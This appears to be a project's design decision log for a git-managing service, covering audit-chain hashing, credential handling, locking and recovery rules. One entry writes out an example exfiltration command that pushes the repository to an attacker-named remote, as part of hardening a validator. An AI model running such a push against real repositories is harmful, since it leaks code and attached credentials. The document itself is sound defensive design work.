### 2026-08-08 — Boot's redrive covers `pending` only, not `failed`
Context: `10-design.md` § control flow #1 step 11 says "Boot re-drives every undelivered row". S11 first read "undelivered" as `pending` **and** `failed`, since a failed row is literally undelivered. A code review found the consequence: a webhook credential that expires and produces two hundred `failed` rows over a week means that fixing the credential and restarting pages the operator with two hundred stale terminal states at once — merge conflicts resolved days ago, timeouts for operations long since settled — and every restart also increments `attempts` on every failed row without bound.
Chosen: `redriveUndelivered` re-attempts `pending` rows only. The durability argument behind boot re-driving is about rows caught mid-flight when a process died, and those are `pending`; a `failed` row was not lost to a crash but reached a decision after exhausting its retries. The contract's answer for it — "mark the row `failed` and surface it. Never drop it" — is satisfied by `listFailed` and the health view's `failedOutboxRows`. Surfacing is not resending, and `clearFailed` is the sanctioned way back for a row a human judges still worth sending.
Rejected: **Redrive `failed` too, bounded by age** — keeps the broader reading and stops the storm, but needs a new deployment number the contract does not fix, and any cutoff is arbitrary. **Redrive `failed` but cap the count per pass** — same objection, and it makes which notifications arrive depend on row ordering. **Keep re-driving everything** — known-and-retained until this review; the storm is a worse operator experience than the gap it closes, and the gap is already covered by the health view.
Known-and-retained consequence: `redriveUndelivered` and `deliverPending` now do the same thing. Both stay because the contract fixes both and they differ in intent — boot's one-shot catch-up versus the ongoing pass — but nothing today distinguishes their behaviour, and a future reader should not infer one from the other.
Reversibility: cheap. One status list in `deliverRows`'s caller.

### 2026-08-08 — `DeliveryReport` carries `errors`, making three `NotifierError` variants reachable
Context: `NotifierError` fixes four variants, but S11's first implementation constructed exactly one (`row-not-found`). `no-transport-configured`, `delivery-failed` and `retries-exhausted` were structurally unreachable rather than merely unused: the only members that could raise them, `deliverPending` and `redriveUndelivered`, return a bare `DeliveryReport` with no error channel at all. A variant nothing can construct constrains nothing, and the same shape is already an open defect elsewhere (issue #47, `HostError.required-check-failed`).
Chosen: `DeliveryReport` gains `readonly errors: readonly NotifierError[]`. The three variants are constructed and reported as data. Delivery stays a report rather than an `Outcome` because one row failing must not abandon the rest of the pass, and a caller that ignores `errors` behaves exactly as before — which is what keeps "delivery never blocks the operation it describes" true.
Rejected: **`deliverPending(): Promise<Outcome<DeliveryReport, NotifierError>>`** — gives the variants a home, but makes one bad row fail a whole pass, and there is no single error that honestly describes a mixed result. **Delete the three unreachable variants from the contract** — smallest change, and it discards the vocabulary the error table already commits to, leaving an operator with counts and no reason for them. **Leave them unreachable and file an issue** — consistent with how #47 was handled, but that issue is evidence the pattern recurs rather than a precedent worth following.
Reversibility: cheap. Adding a field to a report breaks no caller that does not read it.

### 2026-08-08 — `StoreTransaction` carries `run`, so a participant can actually join the transaction
Context: S11's `Notifier.enqueue(request, tx)` is contractually required to commit its outbox row in the caller's transaction — "so the row and the settle commit together". `StoreTransaction` was `{ readonly id: string }`, an opaque token carrying no way to reach the open transaction, so the first implementation ignored `tx` and opened its own connection. Two probes showed both failure directions are real: a row enqueued inside a rolled-back transaction **survives**, and a row enqueued after the caller's transaction has already written is refused as busy, swallowed, and **lost entirely** — `enqueue` returns `void` and has no error channel to report it. That is precisely the failure the same-transaction rule exists to prevent. The defect is not S11's: **four** members take a `StoreTransaction`, and `Declarations.bumpGrantEpoch` had already shipped in S5 with the identical `_tx`-ignoring workaround, flagged there as a local problem for S14 rather than recognised as a contract defect.
Chosen: Amend `StoreTransaction` to `{ readonly id: string; run(sql, ...parameters): void }`. Participants write through `run`; `StructuredStore.transaction` supplies one closing over its own connection. It deliberately exposes no `BEGIN`, `COMMIT` or `ROLLBACK` — the module that opened the transaction is the only one that may end it, since a participant able to commit its caller's transaction would be a worse defect than the one being fixed. Amended now, while only two of the four consumers exist and both are broken, rather than after S13, S14 and S16 have each invented a different workaround.
Rejected: **Give `Notifier` the `StructuredStore` and join through it** — smallest change and it makes S11 correct, but it fixes one member of four and leaves the next three to rediscover the same wall; `AGENTS.md` puts a question a second consumer faces in the shared document, and three more consumers face this one. **Leave `enqueue` as-is and file an issue** — justified by there being no production caller today, but it ships a member whose documented semantics are false, and S17's maintenance summary is the first thing that would hit it. **Drop `enqueue` and route everything through `Journal.settle`** — `settle` is genuinely atomic already, but this diverges from the contract's `Notifier` interface and leaves the `info`-severity maintenance summary with no path at all.
Reversibility: cheap. Two implementations exist, both currently non-functional in this respect, so there is nothing depending on the old shape to migrate.

### 2026-08-08 — `CreatePullRequestInput` carries no base branch, and `pr_open` cannot name one
Context: S10 resolves U1 for the host tools, which requires fixing `CreatePullRequestInput`'s fields. A pull request has a base, and the obvious input carries it.
Chosen: The base is the declaration's `RepositoryConfig.baseBranch`. The input carries `title`, `body`, `headBranch` (null meaning the checked-out branch) and `draft`, and nothing else. `draft` is carried deliberately: a draft pull request cannot auto-merge, so withholding the field would make the more permissive state the only reachable one.
Rejected: **A `baseBranch` field** — it would let a caller open a pull request against a branch the declaration never named, which is the authority the declaration exists to bound, and the same reason `git_push` takes no remote. **A `baseBranch` field validated against an allowlist** — a second allowlist to keep consistent with `RepositoryConfig`, buying a capability nothing has asked for. **Omitting `draft`** — leaves ready-for-review as the only reachable state, and adding the field later is a schema change to a shipped tool.
Reversibility: cheap to add a field; expensive to remove one once a consumer sends it.

### 2026-08-08 — Admission limits live on `Locks`, as a method that never awaits
Context: `LockError.admission-refused` and `AdmissionLimits`' two counters were fixed from the outset with nothing that raised or read them. S10's monitoring wait is the first caller, so S10 has to say where they live.
Chosen: `Locks.admitLockFreeWait(sessionId)`, returning a releasable `WaitAdmission` or refusing outright. It takes neither mutex and never awaits — admission is refused, not queued. `createLocks` receives `DeploymentConfig.admission`.
Rejected: **A separate admission module** — the per-declaration active-operation count already lives on `Locks`, and a second module holding the other two counters is two homes for one concern. **Queueing for admission** — a caller queueing for permission to wait is indistinguishable from the wait itself, and would make `concurrentWaitsPerSession` a latency knob rather than a limit. **Enforcing it in the dispatch pipeline directly** — puts process-wide counters in a component that is constructed per composition root, and makes the limit untestable without a whole pipeline.
Reversibility: cheap — one method on an internal interface, with a single caller.

### 2026-08-08 — The credential mount's layout: file names are references, one manifest holds the host constraints
Context: `10-design.md` fixes that a reference name is a file name in the mount and that each reference "carries its own allowed-host constraint", but not where that constraint lives. S9 has to put it somewhere.
Chosen: `<mount>/<ref>` is the secret; `<mount>/_allowed-hosts.json` maps reference to hosts. The `_` prefix cannot collide with a reference, because `CredentialRef`'s pattern requires `[a-z0-9]` as the first character — the same device the TOTP sealing key already uses. **A reference absent from the manifest permits no host**, and a missing or malformed manifest permits nothing either.
Rejected: **A sidecar file per reference (`<ref>.hosts`)** — `CredentialRef` admits dots, so a reference legitimately named `token.hosts` would collide with another reference's sidecar, and the collision is silent. **A directory per reference** — contradicts the design's "file names are reference names" directly. **Defaulting an absent entry to every host** — `90-decisions.md` 2026-08-03 calls this the *second, independent* guard against credential redirection, and a guard that defaults open leaves the property resting on the deployment allowlist alone, which is the single point the two-guard design exists to avoid.
Reversibility: cheap for the file name; expensive for the fail-closed default once deployments exist, because relaxing it is invisible and tightening it breaks every mount that never wrote a manifest.

### 2026-08-08 — Exec's credential channel is a written shell helper reading an indirected variable
Context: `10-design.md` says git cannot authenticate from a bare environment variable and that Exec supplies the credential channel as configuration ahead of every caller argument. It does not say how, and every mechanism has a different exposure.
Chosen: a `credential-helper.sh` written once into the neutral home at construction, configured as `-c credential.helper= -c credential.helper=!'<path>'`. The script holds no secret and no variable name: it reads the *name* from `SZG_CREDENTIAL_VAR` and dereferences it inside the child, so the value exists only in the child's environment and in the pipe git reads the answer from.
Rejected: **An inline `!`-command through `-c`** — the value would carry shell quoting on the command line, and the one thing that must never be quoted into a command line is anything near the secret. **`git-credential-store` with a credentials file** — writes the secret to disk on the data volume, which invariant S5 and the design's "no secret in the structured store" both push against, and it outlives the process. **`http.extraHeader` with a Basic credential** — puts the secret directly into `argv`, which is exactly what invariant S5 forbids.
Reversibility: cheap — one function in `exec.ts` and one written file.

### 2026-08-08 — A failing credential's mark clears on the secret file's mtime, not on a stored digest
Context: "The mark clears when the resolver observes a changed secret." `credential_failure_mark` has four columns and the contract fixes them, so there is nowhere to persist a digest of the secret that was rejected, and `reason` is operator-facing prose.
Chosen: compare the secret file's modification time against `marked_at`. A file written after the mark was taken is a changed secret; the mark is deleted and the operation proceeds.
Rejected: **An in-process digest map** — lost on restart, and the safe fallback for an unknown digest is "assume changed", which makes every restart clear every mark. **Widening the table with a digest column** — a contract amendment to a schema whose four columns the contract fixes deliberately, for a signal the filesystem already carries. **Requiring the operator to clear it by hand always** — the design explicitly names rotation as the self-clearing path, and says so as one of the three reasons this resolver ships.
Consequence: rewriting the file with identical bytes also clears the mark. That buys exactly one retry, which re-marks immediately if the credential is still wrong, so the failure is re-detected rather than masked.
Reversibility: cheap.

### 2026-08-08 — `sync_base` refuses a diverged base rather than rewriting it
Context: S9 ships base-sync, and the local base branch can carry commits the remote does not. The contract has no reset, rebase or force path anywhere on `GitOperations`.
Chosen: fast-forward only. A local base that is not an ancestor of the fetched upstream returns `precondition` naming both shas, and nothing in the tree is touched. When the base is not checked out the ref is advanced directly; when it is, a `--ff-only` merge does the same movement and refuses in the same case.
Rejected: **`reset --hard` to the upstream** — discards committed work, which invariant R7 forbids and which is the incident the protected-base rule came out of. **Rebasing the local commits** — rewrites history the operator may already have pushed elsewhere, and there is no rebase tool on this interface by design. **Reporting success with `fastForwarded: false`** — makes a refusal indistinguishable from a no-op, and the caller acts on the difference.
Reversibility: cheap.

### 2026-08-08 — `Exec` reports its spawned argument vector through an observation-only seam
Context: Invariant S5's process-argument-vector half was untestable. Every byte a child writes back passes through `scrub`, which redacts each resolved secret — so a secret leaked into `argv` is scrubbed out of the very output a test would read it from, and the test passes while `ps` on the host shows the token. This was found by breaking the implementation deliberately and watching the test still pass.
Chosen: `ExecOptions.onSpawn`, called with the executable and vector immediately before the child becomes a process. Observation only, not part of `Exec`'s contract signature — the same kind of seam `credentialEnv` and `StructuredStoreOptions.migrations` already are.
Rejected: **Asserting on the child's own output** — structurally impossible for the reason above. **Reading the command line from the OS while the child runs** — Windows and Linux need different mechanisms and both race the child's lifetime, in a repository whose tests run on both. **A shim executable that dumps its arguments** — Exec prepends its own configuration ahead of the caller's vector, so the shim would have to parse git's own flags to find them, and Node cannot spawn a `.cmd` shim on Windows without a shell.
Reversibility: cheap.

### 2026-08-08 — The repair gate is a predicate on `executionClass`, not a list of tool names
Context: S8's acceptance criterion named "stage, restore-paths, commit and branch" as what a parked declaration admits to a session holding `attention.resolve`. Branch creation is not a `GitOperations` primitive — it is `Composites.prepareBranch`, delivered by S12, four slices after S8. The criterion named a tool that cannot exist when the slice implementing it runs.
Chosen: the gate admits any registry entry that is `executionClass: 'mutating'` **and carries `git.local.write`**, to a session whose effective grant holds `attention.resolve`, audited with `context: 'repair'`. Today that is three tools; `prepareBranch` joins automatically when S12 registers it, with no change here. `design/30-slices.md`'s S8 criterion was reworded to match, in the same commit.

  **Narrowed during PR #40 review.** The first version of this predicate tested `executionClass` alone, which is wider than the design grants: `git_push` (S9) is a mutating entry, and admitting a push to a parked declaration is new incident-time authority `10-design.md` never gave. `10-design.md` § capabilities maps `git.local.write` to exactly "branch preparation, stage, commit, restore-paths" — the four the repair session names — so requiring that capability reproduces the design's own list as a predicate instead of widening it. The reviewer was also right on process: `10-design.md` outranks `30-slices.md`, and the first rewrite edited only the lower-precedence document.

### 2026-08-08 — `recovery-pending` is derived, not a persisted clone state

### 2026-08-08 — The lazy recovery pass runs on the mutating path, and the triggering call waits for it
Context: `20-contract.md` calls `recoverDeclaration` "the lazy pass, called on first use", and S8 requires it to complete "before the triggering call acquires the mutation lock". Two readings: the triggering mutation is refused with `recovery-pending` and the caller retries, or it waits for the pass and then proceeds.
Chosen: it waits. The pass runs ahead of **both** locks — ahead of the mutation lock because the contract requires a resume to take that lock in its own right, and ahead of the materialisation lock because a resume re-enters the pipeline and calls `ensure` itself, which would otherwise deadlock against a lock the triggering call already holds. `recovery-pending` is then a real refusal with a real window: a *second* mutation arriving while the pass is still running gets it. Reads never consult it.
Rejected: **refusing the triggering call too** — makes "called on first use" mean "refused on first use", and every operator's first mutation after a restart fails once for no reason they can see. **Queueing concurrent mutations behind the pass** — leaves the contract's `recovery-pending` variant dead, and queues a caller behind a pass that may be resuming a whole composite.
Reversibility: cheap — the ordering is contained in `dispatchMutating`.

### 2026-08-04 — `OperatorIdentity` opens a connection per call rather than holding one behind a `close()`

### 2026-08-04 — The TOTP secret is sealed, not hashed, and its key lives in the credential mount
Context: `/slice S4` halted on it. `operator_credential.totp_secret_hash` is typed `NOT NULL` and named as a hash, but TOTP verification recomputes `HMAC-SHA1(secret, timeStep)` on every login and needs the secret's bytes back. A one-way hash makes the factor enrollable once and unverifiable forever after — which would make `totp-invalid` an unreachable error and S4's "TOTP is never optional" untestable. Not an implementation detail: no code can invert a hash.
Chosen: The column becomes `totp_secret_sealed` and holds AES-256-GCM ciphertext (`node:crypto`, no new dependency). The key is a file in the **credential mount**, never on the data volume. Two rules already in the contract force that placement: invariant S5 forbids a secret value in a persisted row, and credential resolution requires the structured store hold no secret "so the pre-migration backups the rollback path depends on carry none either" — and those backups live on the data volume, so a key stored there would put the sealed secret and its key in one copy. The key's reference name begins with `_`, which `CredentialRef`'s pattern cannot produce, so no declaration can name it by construction rather than by convention. A missing key yields a new `totp-key-unavailable`, deliberately **not** fatal at boot, because break-glass is the recovery path and it needs the service running.
Rejected: **Plaintext in the store, on the grounds that volume access is already total via break-glass** — no key management at all, and it violates S5 outright and puts a live secret into every pre-migration backup. **A key file on the data volume** — simplest to operate, and it defeats the backup property that motivated keeping secrets out of the store in the first place. **A deployment environment variable** — strongest separation, and the design explicitly rejects credentials from the container environment, since definition-of-done item 5 fails outright if they come from there. **Derive the secret from a master key and the subject** — stores nothing, and re-enrolment after a burnt recovery code must change the secret, so a per-enrolment salt has to be stored anyway; same key problem, more moving parts.
Reversibility: expensive once an operator has enrolled — the sealed value cannot be re-read without the key, and re-enrolment is the only migration path.
Consequence: the sealing key is now a **required deployment artifact**. Losing it costs TOTP verification, and the way back in is break-glass, which is already the design's defined path for a lost second factor.

### 2026-08-03 — The audit segment files are the trail; `audit_chain_head` is an advisory mirror
Context: Found by `/reconcile` after S3. The implementation read the chain head from `audit_chain_head` and treated it as the source of truth, so a corrupt structured store stopped the audit log entirely — `append` returned `{appended:false}` and `verify` threw. Verified directly. That contradicts S3's own Delivers line ("survives corruption of the structured store"), which is the reason the log is a separate storage kind rather than another table. The design says the head is "mirrored into the structured store"; it never says which side wins, and the implementation guessed wrong.
Chosen: The segment files are authoritative. The head is re-derived from the last parseable record of the highest-numbered segment whenever the mirror is absent or unreadable, and every read of the store from the audit module is best-effort. The mirror keeps two jobs — a fast head read, and detecting a cleanly truncated tail, which leaves no torn line for the parser to catch. Both documents now state the direction explicitly.
Rejected: **Keep the store authoritative and only stop `verify` throwing** — satisfies the contract's no-error-type signature and leaves the trail unwritable while the store is corrupt, so the stated property stays false. **Amend S3 to drop the survival claim** — cheapest, and it discards a property the design chose deliberately and paid for with a separate storage kind. **Mirror into a second file instead of the store** — removes the dependency, and duplicates the trail's own tamper surface for a fast read that re-derivation already provides.
Reversibility: cheap in code; expensive in consequence, since the failure it fixes is invisible until the store is actually corrupt.

### 2026-08-03 — `verify` resumes from a `RetainedAnchor` when a prefix has been pruned

Reversibility: cheap.

### 2026-08-03 — No route handler may take the process down

Combined with the bug above, an attacker able to corrupt the structured store could stop the service with an authenticated health check. Verified directly. Rejected: **Rely on the audit fix making the throw unreachable** — true today, and it leaves every future route one unguarded throw from the same crash. **A process-level `unhandledRejection` handler** — catches everything, and converts a specific bug into a swallowed class of them.
Reversibility: cheap.

### 2026-08-03 — `chainState()` is a full `verify()`, and segments are streamed
Context: The contract gives `chainState` and `verify` the same return type and says nothing about cost or freshness. `/health` calls `chainState` on every request, and `verify` walks every segment.
Chosen: `chainState` re-derives from disk exactly as `verify` does, so the health report can never serve a cached state that predates a corruption. Segment reading is streamed line-by-line rather than slurped, so peak memory is constant instead of a function of `auditSegmentBytes` (64 MiB by default). Rejected: **Cache the verified state and invalidate on append** — much cheaper per request, and a corruption arriving between appends would not surface until the next one, which defeats the point of reporting it. **Have `chainState` return only the mirrored head** — cheapest, and it reports a head without verifying anything, so a broken chain would read as healthy.
Reversibility: cheap.

### 2026-08-03 — Audit holds its own connection to the structured store
Context: The audit module needs `audit_chain_head` and `audit_retained_anchor`. `StructuredStore` exposes no query interface — `StoreTransaction` is opaque (`{id: string}`), and four contract signatures that take one are synchronous, which reads as "each module holds its own handle" rather than "the store hands out a cursor".
Chosen: A second `DatabaseSync` handle to the same file, opened lazily and treated as optional throughout. This also falls out of the advisory-mirror decision: a module that must keep working when the store is unreadable cannot depend on another module's successfully-opened handle.
Rejected: **Add a query method to `StructuredStore`** — the tidier dependency, and it invents public contract surface the contract does not have, which `AGENTS.md` forbids without an amendment. **Pass the head in and out through `Lifecycle`** — no new handle, and it puts the chain's integrity in a caller's hands.
Reversibility: cheap.

### 2026-08-03 — Audit segment layout is fixed in the contract
Context: The segment layout is an on-disk format a reimplementation must match to read an existing trail — the same class of fact as U9, which was worth a contract amendment for the same reason. The contract fixed the lease files precisely but said only "one `AuditRecord` JSON per line" about segments.
Chosen: `audit/NNNNNN.jsonl` under the volume root, six zero-padded digits from `000001`, one compact record per line with a trailing newline, and rotation **before** writing a record that would exceed the cap — so a segment only exceeds `auditSegmentBytes` when a single record does. Recorded in the contract's file table beside the lease.
Rejected: **Leave it to the code** — nothing else parses these files today, and "today" is the whole problem with unbackfillable formats. **Rotate after exceeding the cap** — one fewer branch, and it makes the cap advisory rather than a bound.
Reversibility: expensive once a trail exists — every segment path and the trailing-newline convention are baked into files on disk.

### 2026-08-03 — A failed mirror write never fails the append it describes
Context: The file append is the durable record; the `audit_chain_head` update follows it. If the store write fails, the record is already on disk.
Chosen: Swallow the mirror failure. The append is reported as succeeded because it did succeed, and the next `verify` — or the next append's re-derivation — recovers the head from the files.
Rejected: **Fail the append** — keeps the two in lockstep, and would discard a record already written, turning a store problem into a hole in the audit trail. **Roll back the file write** — impossible on an append-only log without violating what append-only means.
Reversibility: cheap.

### 2026-08-03 — `NO_PREDECESSOR_SENTINEL` for a break with no real predecessor
Context: `AuditChainBreak.expectedHash` is a non-nullable `Sha256Hex`, but a break at the very first record has no predecessor hash to expect.
Chosen: The SHA-256 of the empty string, the same well-known constant used for `NO_CONSOLE_FINGERPRINT`. It is a valid `Sha256Hex`, so the brand's invariant holds, and it is recognisable as a sentinel to anyone who looks it up.
Rejected: **Widen `expectedHash` to nullable** — most honest, and it changes a contract type to accommodate one edge case. **An all-zero string** — obviously a placeholder, and not a valid SHA-256, so it would have to bypass the brand's own validator.
Reversibility: cheap.

### 2026-08-03 — U9 is resolved: the audit record's canonical serialisation
Context: `30-slices.md` gates S3 on U9 explicitly, and states the trail is unbackfillable — two implementations that disagree about what the hash covers make every chain unverifiable across an upgrade, permanently, the same class of consequence as U8. `/slice S3` halted on it rather than inventing a serialisation silently.
Chosen: `hash = SHA256_hex(canonical(record))`, where `record` is the full flattened `AuditRecord` — `AuditRecordBase` merged with whichever `AuditRecordBody` variant applies — with only its own `hash` field omitted; `sequence` and `previousHash` are included like every other field. `canonical()` is deep key-sorted JSON, array order preserved, reusing the compiler's registry-fingerprint canonicalisation rather than inventing a second one. The genesis record (`previousHash: null`) hashes the same way, with no special case. File storage is unconstrained by this: each line is plain `JSON.stringify(record)`, and `verify` re-derives the canonical form from the parsed object before re-hashing.
Rejected: **Hash `AuditRecordBase` and each `AuditRecordBody` variant separately** — the type is a flat intersection at the value level, so splitting it back into two hash inputs is a seam with no benefit. **Treat `previousHash` as a separate concatenation rather than an ordinary hashed field** — near-identical in effect, and it's an extra rule to get right on reimplementation for no detection gain, since it's already a field of the record. **A binary or CBOR canonical form** — deterministic and smaller, and it would be a new dependency and a second serialisation format in a codebase that otherwise has exactly one.
Reversibility: expensive once any record is appended in production — every retained segment's hashes are computed against this rule.

### 2026-08-03 — The instance-lease handle is held from module scope, because GC releasing it is silent dual ownership
Context: Found while implementing S2, by a test that spawns a real holder process and probes it from outside. The first implementation kept the open lock handle reachable only through the object `acquire` returned. Every short test passed — the process exits before any collection — but a holder that reached the event loop and idled lost the lock within a fifth of a second, while alive, healthy, and still reporting itself ready. A separate process was then granted the same volume. The design's stale-lock reasoning covers process *death* and correctly concludes the kernel cleans up; it does not cover the handle being finalised under a living process, which produces the same dual ownership with no kill, no log line and a self-test that passed minutes earlier.
Chosen: Open lock handles are held in a module-scoped set for the process's lifetime, removed only on explicit release. The lifetime of the OS lock is tied to the lifetime of the process by construction rather than by reachability. `10-design.md` boot step 1 now names the failure, so it cannot be reintroduced by someone reimplementing the lease from the design alone.
Rejected: **Rely on the returned guard keeping the handle alive** — the natural reading, and what was written first; it makes a correctness-critical OS resource depend on an optimisation detail nobody controls, and the bug it produces is invisible to any test whose process exits promptly. **A keep-alive timer or periodic re-acquire** — would paper over collection without preventing it, and turns a structural guarantee into a race. **A finaliser that re-acquires** — re-acquisition after release is exactly the window a second instance uses.
Reversibility: cheap in code, expensive in consequence — reverting reintroduces a failure that testing did not catch the first time.

### 2026-08-03 — SQLite is both the structured store and the advisory-lock primitive; no new dependency
Context: S2 needs a transactional store and an exclusive advisory OS lock that the kernel releases on death. Node ships no `flock` binding, and `AGENTS.md` requires a decision-log entry naming rejected alternatives before any new dependency.
Chosen: `node:sqlite`, a runtime builtin, for both. The store is an ordinary database; the lease lock is a `BEGIN EXCLUSIVE` transaction held open on a dedicated file that exists only to be locked, which is a real `fcntl`/`LockFileEx` advisory lock. Both properties the design depends on were verified directly against real processes before anything was built on them: a second process is refused while the holder lives, and the lock is released by the kernel on `SIGKILL`.
Rejected: **`better-sqlite3`** — the usual choice and faster, and it is a native dependency needing a compiler in the image for a workload that is not throughput-bound. **A lock file created with `wx`** — no dependency, and it leaves a stale file after an unclean kill, which is precisely the case the brief demands be handled. **A native `flock` binding** — the most literal reading of "advisory OS lock", for one syscall, at the cost of a compiled dependency.
Reversibility: expensive — the schema, the migration story and the lease mechanism all sit on it.

### 2026-08-03 — The lease is two files: one carries the lock, one carries the contents

### 2026-08-03 — Orphaned declarations stay operable; the dead end between refusal and remedy
Context: The fourth pass added an adoption refusal for unclean orphaned clones and, as its remedy, `clone.remove`. Both use the safe-to-evict predicate, so an orphan holding an unpushed branch was refused adoption *and* refused removal, its override covering only corrupt trees. Orphaning had already revoked every grant naming the resource, so no MCP route existed either. The remedy refused in exactly the cases the refusal fired.
Chosen: An orphaned declaration still serves the console under `declaration.manage` — reads plus the typed write and push tools. Orphaning withdraws a repository from ordinary service; it does not strand what is in its tree. The exit is push, then `clone.remove`, then `declaration.remove`. The same shape as the repair session: a state that blocks ordinary traffic still admits the operator's recovery path.
Rejected: **A second `clone.remove` override that discards unpushed work** — simplest, and it puts the one refusal the brief and the prior art both treat as absolute behind a flag. **A narrower adoption predicate than the removal predicate** — removes the trap for the commit case, and re-opens what the adoption refusal closed, since the adopting grant would inherit commits it never authorised.
Reversibility: cheap.

### 2026-08-03 — Published-URL verification and item 15's self-verification are two different checks
Context: The fourth pass gave the http adapter a consumer and justified it by a classified failure set — `stale-runtime`, `mixed-runtime`, `verification-credential`, `unexpected-profile-or-catalog`. Those come from the brief's companion script, which verifies *this service's own* deployment by polling `/healthz` and running an authenticated `initialize → tools/list → repo_status` session. An unauthenticated GET of a managed repository's published URL can produce none of them, and definition-of-done item 15 was left with no owner anywhere in the design.
Chosen: Separate them. The http adapter's consumer is published-URL verification of a managed repository, with the failure set an unauthenticated GET can actually distinguish — unreachable or non-2xx, a 200 serving the wrong commit, and the declared timeout. Item 15 stays what the brief calls it: an executable check shipped alongside the service rather than a registry tool, keeping all four classifications.
Rejected: **Point the adapter at this service's own verification instead** — exercises it hardest and keeps the four classifications, and it needs a credential at L3, which is why published-URL verification was chosen over deploy-status polling in the first place. **Defer the adapter entirely** — the option already declined once; re-offered because the consumer it was given turned out not to fit, and declined again.
Reversibility: cheap now.

### 2026-08-03 — Smaller corrections from the fifth pass
Context: Findings whose resolution carries no rejected alternative worth preserving.
Chosen: The recovery ladder gains a branch for a missing recovery descriptor, and boot's re-validation sweep extends from pending scheduled jobs to unsettled journal entries — an upgrade can remove a descriptor an entry depends on, and both are store queries that cost nothing against lazy recovery. ### 2026-08-03 — The watcher is specified from `blog-mcp`'s running one, not designed fresh
Context: A fifth redteam pass returned six findings against the content-drop watcher the fourth pass had added — more than against any other component, and unsurprising, since it was the only wholly new scope and had been designed in one sitting without reading the prior art's implementation. `SubZeroDev.Blog/tools/blog-mcp/src/watcher/engine.ts` is ~450 lines with its own test file, running in production. It should have been the input to that design and was not.
Chosen: Respecify from the running implementation. Inherited whole: the four-directory state machine (inbox, `processing/`, `processed/`, `failed/`) with **claim-by-rename before any git or host action**; `processing/` as the crash marker, moved to `failed/` at startup and **never reprocessed**, because a claimed file may already have an open pull request; a link-preserving stat so a symlink dropped into a bind-mounted directory cannot have its target's content published; a clean-tree precondition making a tick a no-op rather than an error; polling rather than inotify, because bind mounts under Docker Desktop and WSL2 are unreliable for change notification; the full sequence through to a pull request with auto-merge; a pending-pull-request list re-derived from the host each tick so an unattended publish is still reconciled once it merges; temp-then-rename for that list; three independent off-by-default switches; and `WATCHER_CAPABILITIES`'s stripped write prefixes. Two things are generalised rather than copied: the drop is per declaration rather than per container, and the operation it dispatches is **named by the declaration and must be a registry tool annotated as a drop target**, rather than hardcoded to `blog_create_post`.

Consequence: Five of the six watcher findings are resolved by inheritance rather than by invention, which is the point — every one of them had already been encountered and answered once. The sixth, that the drop directory was missing from the orphaning-dependents table, is fixed directly. The episode is the strongest argument yet for `AGENTS.md`'s standing instruction that `blog-mcp` is load-bearing prior art rather than inspiration: the fourth pass wrote a watcher without reading the watcher.
Reversibility: cheap as text; the mechanisms are inherited rather than novel, which is what makes them cheap to implement too.

### 2026-08-03 — Fourth redteam pass: twenty-nine findings, all resolved, two adding scope

### 2026-08-03 — Host-side mutations journal a step before the call
Context: Recovery's first branch settles an entry when pre-state matches and no step is `applied`. Every field in `preState` is local — branch, `HEAD`, upstream, index and worktree digests — so a push the remote accepted, or a `gh` call that opened a pull request, leaves all of them untouched if the process dies before the local remote-tracking ref updates. The design separately asserted that a host mutation "leaves no local trace at all" and therefore lands in the "neither matches" branch, which is exactly backwards: no local trace is the condition that *satisfies* branch one.
Chosen: Every operation that mutates something outside the local clone journals a step marked `applied` before making the call, not composites alone. The existing "no step is `applied`" guard then does the work it was written for, and an interrupted host mutation parks as `attention` instead of settling as a non-event.
Rejected: **Recovery probes the host before classifying** — the strongest answer, since it asks the remote what actually happened; rejected because it makes boot recovery depend on host reachability and a valid credential, and puts a rate-limit consumer on the restart path. **Park every unsettled host-mutating entry unconditionally** — safest and simplest to state, and it turns every ordinary interrupted push into operator toil.
Consequence: A step marked `applied` whose call never in fact left the process now parks too. That errs toward operator attention rather than toward a silent settle, which is the correct direction for this failure.
Reversibility: cheap now; expensive once composites and host operations are written against the old rule.

### 2026-08-03 — `git.raw` remote operands must match the declaration's own remote
Context: The hatch's operand rule required any URL-shaped operand to resolve to a host on the deployment's remote-host allowlist, and the design claimed that rule plus the remote-persisting-subcommand refusals "close" the brief's binding non-goal that a caller can never hand the service a repository URL. They do not. `github.com` is necessarily on the allowlist, because every GitHub declaration clones from it, so `git push https://github.com/attacker/sink.git` satisfies both rules while exfiltrating the repository — with the declaration's credential attached.
Chosen: An operand that parses as a URL or an scp-style remote must normalise to this declaration's `cloneUrl`. The allowlist keeps its job at declaration time, where the question is which hosts the deployment may talk to at all; the operand check answers which repository.
Rejected: **No remote operands in the hatch at all** — strongest and easiest to verify, and it narrows "full git is reachable" to exclude everything that talks to a remote. **Record as known-and-retained** — consistent with the hatch's already-accepted code execution, and it leaves a stated non-goal stated as closed while open.
Consequence: This is the second time the hatch has violated the same binding non-goal in plain sight, after the third pass found the operand gap itself. The pattern is that each fix constrained the *form* of the argument and not the *target*.
Reversibility: cheap now; it is the validator `/contract` will emit.

### 2026-08-03 — Adopting an orphaned clone is refused unless the tree is clean
Context: Orphaning leaves the clone on disk and re-declaring the same `id` adopts it when the remote matches. Two other rules meet that badly: recovery selects journal entries by `(declarationId, generation)`, so a previous era's unsettled entry structurally cannot match; and clone state derives `dirty` rather than `recovery-pending` when no entry matches. A new declaration with a narrower `writablePathPrefixes` therefore serves mutations over a tree holding the previous era's uncommitted work and half-applied side effects, and the next commit and push carry them.
Chosen: Adoption runs the same predicate eviction uses — clean tree, nothing ahead of upstream, no stash — plus a check for unsettled journal entries across **every** generation rather than the current one, and refuses with a `precondition` naming what blocks it.
Rejected: **Carry the previous generation's unsettled entries forward** — preserves the record rather than refusing, and it reopens the "re-declaring inherits nothing" property that `generation` was introduced to make enforceable. **Never adopt; always re-clone to a fresh path** — cleanest isolation, at the cost of a full re-clone and an orphaned directory that needs removing anyway.
Consequence: Re-declaring a dirty orphan now requires clearing it first, which is what forced `clone.remove` to become a real operation rather than a referenced one.
Reversibility: cheap.

### 2026-08-03 — The first operator credential is provisioned from a file on the volume
Context: Every part of the identity design assumed an operator already existed. Recovery codes are generated "at first enrolment", break-glass is "consumed at the next login", OIDC matches a subject "against the allowlist" — and nothing described how any of them come to exist. On a publicly reachable origin the interval between first boot and first enrolment is either an open setup route or a service nobody can log into, and the design said which it was nowhere.
Chosen: A provisioning file written by an operator with host access, looked for only when no operator credential exists. While neither is present readiness does not pass and the log names what is missing. The file arms exactly one login, which enrols the password and the mandatory TOTP factor, shows the ten recovery codes once, and burns the file. No HTTP route is ever unauthenticated at any point in the lifecycle.
